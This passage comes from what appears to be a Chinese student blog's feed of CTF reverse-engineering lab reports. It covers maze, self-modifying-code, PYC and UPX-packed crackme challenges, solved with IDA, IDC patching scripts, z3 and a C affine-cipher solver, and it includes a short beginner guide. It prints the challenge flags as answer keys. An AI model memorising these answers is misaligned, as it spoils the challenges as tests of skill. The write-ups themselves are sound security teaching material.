      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">97</span> )</span><br><span class="line">          v2 = sub_5605D8C00FEC();</span><br><span class="line">      &#125;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != <span class="number">1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( dword_5605D8E02AB0 == <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++dword_5605D8E02AB0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;success! the flag is flag&#123;md5(your input)&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据在内存中的情况可列为下图(3个迷宫):</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">01 01 01 01 01 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line"> 01 01 01 01 01 00 03 01 01 00 00 00 00 00 00 </span><br><span class="line"> 01 01 01 01 01 00 00 00 01 00 00 00 00 00 00 </span><br><span class="line"> 01 01 01 01 01 00 00 00 01 00 00 00 00 00 00 ddsssddddsssdss</span><br><span class="line"> 01 01 01 01 01 00 00 00 01 01 01 01 01 00 00 </span><br><span class="line"> 01 01 01 01 01 00 00 00 00 00 00 00 01 00 00 </span><br><span class="line"> 01 01 01 01 01 00 00 00 00 00 00 00 01 00 00 </span><br><span class="line"> 01 01 01 01 01 00 00 00 00 00 00 00 01 01 00</span><br><span class="line"> 01 01 01 01 01 00 00 00 00 00 00 00 00 01 00 </span><br><span class="line"> 01 01 01 01 01 00 00 00 00 00 00 00 00 04 00 </span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 </span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01</span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 </span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 </span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 </span><br><span class="line"></span><br><span class="line"> 01 01 00 00 00 00 00 00 00 00 00 00 00 00 00 dddddsssddddsssaassssddds</span><br><span class="line"> 01 01 00 03 01 01 01 01 01 00 00 00 00 00 00 </span><br><span class="line"> 01 01 00 01 01 00 00 00 01 00 00 00 00 00 00 </span><br><span class="line"> 01 01 00 00 00 00 00 00 01 00 00 00 00 00 00 </span><br><span class="line"> 01 01 00 01 01 00 00 00 01 01 01 01 01 00 00</span><br><span class="line"> 01 01 00 01 01 00 00 00 00 00 00 00 01 00 00 </span><br><span class="line"> 01 01 00 01 01 00 00 00 00 00 00 00 01 00 00 </span><br><span class="line"> 01 01 00 01 01 00 00 00 00 00 01 01 01 01 00 </span><br><span class="line"> 01 01 00 01 01 00 00 00 00 00 01 00 00 01 00</span><br><span class="line"> 01 01 00 01 01 00 00 00 00 00 01 00 00 00 00 </span><br><span class="line"> 01 01 00 01 01 01 01 01 01 00 01 00 01 01 00 </span><br><span class="line"> 01 01 00 01 01 01 01 01 01 01 01 01 01 01 00 </span><br><span class="line"> 01 01 00 00 00 00 00 00 00 00 00 00 00 04 00</span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 </span><br><span class="line"> 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 </span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  </span><br><span class="line"> 00 03 01 01 00 00 00 00 00 00 00 00 00 00 00 ddssddwddssssssdddssssdddss</span><br><span class="line"> 00 00 00 01 00 01 01 01 00 00 00 00 00 00 00 </span><br><span class="line"> 00 00 00 01 01 01 00 01 00 00 00 00 00 00 00</span><br><span class="line"> 00 00 00 00 01 00 00 01 00 00 00 00 00 00 00 </span><br><span class="line"> 00 01 01 00 01 00 00 01 00 00 00 00 00 00 00</span><br><span class="line"> 00 00 01 01 01 00 00 01 00 00 00 00 00 00 00 </span><br><span class="line"> 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 </span><br><span class="line"> 00 00 00 00 00 00 00 01 01 01 01 00 00 00 00 </span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00</span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 </span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 </span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 01 01 01 01 00 </span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00</span><br><span class="line"> 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00</span><br></pre></td></tr></table></figure></div>

<p>答案是D0g3{ddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddss}</p>
<p>居然没用md5，被骗了 doge</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>smc</title>
    <url>/2023/03/04/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/smc/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __usercall <span class="title function_">sub_411244</span><span class="params">(<span class="type">unsigned</span> __int8 a1@&lt;al&gt;, <span class="type">unsigned</span> __int16 a2@&lt;dx&gt;, <span class="type">int</span> a3@&lt;edi&gt;)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_4117A0(a1, a2, a3);</span><br><span class="line">&#125;<span class="comment">//此处是被加密后的函数</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x004117A0</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">171</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(addr+i,<span class="built_in">Byte</span>(addr+i)^(<span class="number">-18</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//可以通过idc脚本来解密,解密后需要手动找到对应的位置进行代码转化，ida可能识别不到对应的是个函数 用p键对准函数头来将其识别为函数</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4117A0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C0A2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = ((*(_BYTE *)(i + a1) | ~*(_BYTE *)(a1 + (i + <span class="number">1</span>) % a2)) &amp; (*(_BYTE *)(a1 + (i + <span class="number">1</span>) % a2) | ~*(_BYTE *)(i + a1)))</span><br><span class="line">                       + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;<span class="comment">//解密后的加密过程</span></span><br></pre></td></tr></table></figure></div>

<p>pythonz3解题方法如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">0x90</span>,<span class="number">0xA0</span>,<span class="number">0xF8</span>,<span class="number">0x93</span>,<span class="number">0x8F</span>,<span class="number">0xF8</span>,<span class="number">0xF3</span>,<span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0xE7</span>,<span class="number">0x9F</span>,<span class="number">0xFB</span>,<span class="number">0x8F</span>,<span class="number">0xE9</span>,<span class="number">0x00</span>,<span class="number">0xEB</span>,<span class="number">0xE6</span>,</span><br><span class="line">    <span class="number">0xED</span>,<span class="number">0xEE</span>,<span class="number">0xED</span>,<span class="number">0xF4</span>,<span class="number">0xEE</span>,<span class="number">0xE1</span>,<span class="number">0xFD</span>,<span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0xE7</span>,<span class="number">0xFC</span>,<span class="number">0xE3</span>,<span class="number">0x00</span>,<span class="number">0x9A</span>,<span class="number">0x00</span>,<span class="number">0x9B</span>,<span class="number">0x39</span>]</span><br><span class="line">flag =[BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">out=[<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    out[i]=flag[i]</span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    out[i]=((out[i]|~out[(i+<span class="number">1</span>)%<span class="number">32</span>])&amp;(out[(i+<span class="number">1</span>)%<span class="number">32</span>]|~out[i]))+<span class="number">1</span><span class="comment">#注意括号，因为运算符号顺序不同括号很重要！</span></span><br><span class="line">    f.add(out[i]==a[i])</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br></pre></td></tr></table></figure></div>

<p>答案为</p>
<p>B2RZ7FNCMT50AVVCYJXKGUJITMITT22W</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>入门</title>
    <url>/2023/06/08/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="此仅作为CTF逆向入门"><a href="#此仅作为CTF逆向入门" class="headerlink" title="此仅作为CTF逆向入门"></a>此仅作为CTF逆向入门</h1><p>逆向内容实际还有很多</p>
<p>强烈推荐《逆向工程核心原理》直接从入门到入土</p>
<h2 id="1-简单理解c语言基本代码逻辑"><a href="#1-简单理解c语言基本代码逻辑" class="headerlink" title="1.简单理解c语言基本代码逻辑"></a>1.简单理解c语言基本代码逻辑</h2><p>能读懂大部分c语言代码就行，可以通过ida对大部分exe，elf文件进行反汇编出c语言伪代码</p>
<h2 id="2-简单了解x86汇编基本指令及功能"><a href="#2-简单了解x86汇编基本指令及功能" class="headerlink" title="2.简单了解x86汇编基本指令及功能"></a>2.简单了解x86汇编基本指令及功能</h2><p>有些exe需要你来修改其代码逻辑，需要理解汇编代码的能力，才能对其代码逻辑进行修改</p>
<h2 id="3-学会使用ida"><a href="#3-学会使用ida" class="headerlink" title="3.学会使用ida"></a>3.学会使用ida</h2><p>ida是逆向常用工具，可以对exe，elf文件反汇编为c语言伪代码，同时可以对对应进程进行调试，获取堆栈信息，修改内存，功能非常强大，虽然界面比较简陋，但是。。。。习惯就好！</p>
<h2 id="4-看看CTF-Wiki"><a href="#4-看看CTF-Wiki" class="headerlink" title="4.看看CTF-Wiki"></a>4.看看CTF-Wiki</h2><p>CTF-Wiki上有比较详尽的学习指导，包含多个方向的入门，以及简介。</p>
<h2 id="5-刷题-根据题目要求又去学习"><a href="#5-刷题-根据题目要求又去学习" class="headerlink" title="5.刷题,根据题目要求又去学习"></a>5.刷题,根据题目要求又去学习</h2><p><a class="link"   href="https://www.nssctf.cn/problem" >题库 | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://buuoj.cn/login?next=/challenges?" >BUUCTF在线评测 (buuoj.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这几个网站都有丰富的题库，基本各方向各方面的题都有。实践是检验能力，提升能力的重要渠道，刷题可以让你的ctf能力更加强大！</p>
<h2 id="5-不会就问-★★★★★"><a href="#5-不会就问-★★★★★" class="headerlink" title="5.不会就问(★★★★★)"></a>5.不会就问(★★★★★)</h2><p>如果有不会的直接问学长就行，我们的学长非常的友好，也可以与其他同学交流，有的题就是灵光一闪就做出来了（doge）</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>学习报告(最后一次任务)</title>
    <url>/2023/01/05/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A(%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E4%BB%BB%E5%8A%A1)/</url>
    <content><![CDATA[<h1 id="RE1-PYC"><a href="#RE1-PYC" class="headerlink" title="RE1.PYC"></a>RE1.PYC</h1><p>先启动该文件看下运行结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230149458.png"
                      alt=" "
                ></p>
<p>不知道是因为什么无法再次运行，通过搜索找到是因为没有原py文件所以无法再次运行，那就通过ida(32位)看看其源代码</p>
<p>pyc文件主要是无法通过f5反汇编查找代码逻辑</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230149318.png"
                      alt="image-20221203235426178"
                ></p>
<p>尝试通过shift+f12查询字符串，结果如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230149357.png"
                      alt="image-20221203234728213"
                ></p>
<p>一般有效的字符串，线索之类的会出现在此，如果不有效也一般会放在内存附近（一般）</p>
<p>通过双击寻找，往上翻后最终找到了对应的密文（非flag{}此类格式应该是经过了加密）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150550.png"
                      alt="image-20221203235623344"
                ></p>
<p>下方也有说明，表现是通过base64加密的，将其拖入base64中解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150846.png"
                      alt="image-20221203235745853"
                ></p>
<p>得到了最后的flag：D0g3{Do_You_Want_To_Hammer_Me}</p>
<h1 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150198.png"
                      alt="image-20221204003416911"
                ></p>
<p>通过反汇编找到对应函数极少（一般是通过了加壳）</p>
<p>再通过寻找字符串，发现确实是通过了upx加壳,且是3.96版本，用普通的脱壳尝试如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150785.png"
                      alt="image-20221204004546195"
                ></p>
<p>发现报错无法脱壳</p>
<p>疯狂百度，发现是经过了特征码修改</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150368.png"
                      alt="image-20221205152424562"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150741.png"
                      alt="image-20221205152739287"
                ></p>
<p>尝试通过winhex修改该文件,失败了。</p>
<p>通过开挂发现需要dump</p>
<p>不太成功dump出源文件后（需进行反反编译操作将真正的EOP找到，然后再将源文件dump下来，此处我不知道为什么无法获取对原文加密的函数）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150199.png"
                      alt="image-20221212212627494"
                ></p>
<p>正常情况应该如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150740.png"
                      alt="image-20221212213109598"
                ></p>
<p>此处以正常情况距离</p>
<p>先通过shift+f12搜索显示的字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230150052.png"
                      alt="image-20221212213343179"
                ></p>
<p>双击选中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230151495.png"
                      alt="image-20221212213424909"
                ></p>
<p>再通过x查询交叉引用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230151570.png"
                      alt="image-20221212213452131"
                ></p>
<p>成功找到对应函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230151262.png"
                      alt="image-20221212213524142"
                ></p>
<p>再通过f5反汇编就可以大致看懂了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230151830.png"
                      alt="image-20221212213555159"
                ></p>
<p>根据wp所说此处采用了多重加密（包含仿射加密）</p>
<p>根据此处可以获得仿射加密的字典</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(v29, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789&#123;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>还有被加密的的字符</p>
<p>unsigned char是因为默认字符有负数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a[]=&#123;</span><br><span class="line">		<span class="number">0x0A</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x0A</span>,<span class="number">0xF3</span>,<span class="number">0x1C</span>,<span class="number">0x1C</span>,<span class="number">0x04</span>,</span><br><span class="line">		<span class="number">0xF2</span>,<span class="number">0x02</span>,<span class="number">0xF7</span>,<span class="number">0x08</span>,<span class="number">0xF5</span>,<span class="number">0x08</span>,<span class="number">0xF5</span>,<span class="number">0x08</span>,</span><br><span class="line">		<span class="number">0x20</span>,<span class="number">0x32</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x08</span>,<span class="number">0xF3</span>,<span class="number">0x04</span>,<span class="number">0x0A</span>,</span><br><span class="line">		<span class="number">0x0A</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x04</span>,<span class="number">0xF7</span>,<span class="number">0x08</span>,<span class="number">0x2A</span>,<span class="number">0x12</span>,</span><br><span class="line">		<span class="number">0x2A</span>,<span class="number">0xF5</span>,<span class="number">0x04</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x04</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,</span><br><span class="line">		<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x0D</span>,<span class="number">0x34</span>,<span class="number">0xF2</span>,<span class="number">0x0D</span>,<span class="number">0xF5</span>,<span class="number">0x0A</span>,</span><br><span class="line">		<span class="number">0x12</span>,<span class="number">0xF3</span>,<span class="number">0x02</span>,<span class="number">0xF2</span>,<span class="number">0x12</span>,<span class="number">0x12</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,</span><br><span class="line">		<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x0D</span>,<span class="number">0xF3</span>,<span class="number">0x0A</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据仿射加密规则c(密文)&#x3D;(a*m(待加密字符)+b)(mod n)</p>
<p>解密则需要获得密钥a与字典长度n的最大公因数gcd（a,n）</p>
<p>d(解密)&#x3D;(a-gcd(a,n)(c-b))(mod n)</p>
<p>其通过异或加密和数字分解加密将实际值掩盖了，首先应该通过</p>
<p>先异或回去再将质数乘回来</p>
<p>如下</p>
<p>此处分别异或的为0xf0和0x0f</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230151819.png"
                      alt="image-20221213151537448"
                ></p>
<p> 将分解出的质数拿出来放入数组中得</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> divi_step[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,</span><br><span class="line">		<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据wp</p>
<p>具体处理则为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a[]=&#123;</span><br><span class="line">		<span class="number">0x0A</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x0A</span>,<span class="number">0xF3</span>,<span class="number">0x1C</span>,<span class="number">0x1C</span>,<span class="number">0x04</span>,</span><br><span class="line">		<span class="number">0xF2</span>,<span class="number">0x02</span>,<span class="number">0xF7</span>,<span class="number">0x08</span>,<span class="number">0xF5</span>,<span class="number">0x08</span>,<span class="number">0xF5</span>,<span class="number">0x08</span>,</span><br><span class="line">		<span class="number">0x20</span>,<span class="number">0x32</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x08</span>,<span class="number">0xF3</span>,<span class="number">0x04</span>,<span class="number">0x0A</span>,</span><br><span class="line">		<span class="number">0x0A</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x04</span>,<span class="number">0xF7</span>,<span class="number">0x08</span>,<span class="number">0x2A</span>,<span class="number">0x12</span>,</span><br><span class="line">		<span class="number">0x2A</span>,<span class="number">0xF5</span>,<span class="number">0x04</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x04</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,</span><br><span class="line">		<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x0D</span>,<span class="number">0x34</span>,<span class="number">0xF2</span>,<span class="number">0x0D</span>,<span class="number">0xF5</span>,<span class="number">0x0A</span>,</span><br><span class="line">		<span class="number">0x12</span>,<span class="number">0xF3</span>,<span class="number">0x02</span>,<span class="number">0xF2</span>,<span class="number">0x12</span>,<span class="number">0x12</span>,<span class="number">0xF2</span>,<span class="number">0xF2</span>,</span><br><span class="line">		<span class="number">0xF2</span>,<span class="number">0xF2</span>,<span class="number">0x0D</span>,<span class="number">0xF3</span>,<span class="number">0x0A</span>,</span><br><span class="line">	&#125;;<span class="comment">//获取的密文</span></span><br><span class="line">	<span class="comment">//0 1 4</span></span><br><span class="line">	<span class="type">int</span> divi_step[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,</span><br><span class="line">		<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line">		<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,</span><br><span class="line">	&#125;;<span class="comment">//一般F0 最后一位0F</span></span><br><span class="line">	<span class="type">char</span> table[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789&#123;&#125;&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> wp[<span class="number">64</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> btmp=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,pre_base=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//素数分解逆推</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		btmp=<span class="number">1</span>;		</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;divi_step[i];j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(j==divi_step[i]<span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				btmp=(a[pre_base+j]^<span class="number">0x0F</span>)*btmp;<span class="comment">//</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				btmp=(a[pre_base+j]^<span class="number">0xF0</span>)*btmp;<span class="comment">//将原来异或的文字异或回去</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		wp[i]=btmp;</span><br><span class="line">		pre_base+=divi_step[i];</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//异或逆推</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">31</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">// 1 2 3</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">31</span>)</span><br><span class="line">			wp[i]=wp[i]^wp[<span class="number">0</span>];<span class="comment">//通过异或的可逆性恢复原来的字符</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			wp[i]=wp[i]^wp[i+<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//仿射密码学逆推</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		wp[i] = (<span class="type">unsigned</span> <span class="type">char</span>)((wp[i] - <span class="number">47</span>) * <span class="number">45</span>) % <span class="number">64</span>;<span class="comment">//强制转化为unsigned char 防止出现负数</span></span><br><span class="line">        <span class="comment">//这个符号的处理很重要的</span></span><br><span class="line">		wp[i] = table[wp[i]];</span><br><span class="line">	&#125;</span><br><span class="line">	wp[<span class="number">32</span>]=<span class="number">0</span>;<span class="comment">//给字符串一个结尾</span></span><br><span class="line">	<span class="built_in">puts</span>((<span class="type">char</span>*)wp);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span 